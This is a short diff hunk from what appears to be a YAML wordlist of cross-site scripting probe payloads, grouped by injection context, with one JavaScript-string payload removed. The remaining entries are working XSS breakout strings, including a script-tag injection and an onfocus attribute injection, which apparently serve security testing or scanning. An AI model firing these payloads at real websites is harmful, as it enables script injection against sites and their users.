@@ -6,7 +6,6 @@ payloads:
         - -(confirm)(document.domain)//
         - ; alert(1);//
         - '-alert(document.domain)-'
-        - ';alert(document.domain)//
     - attr_context:
         - "><script>alert(1)</script><"
         - " autofocus onfocus=alert(1) x="
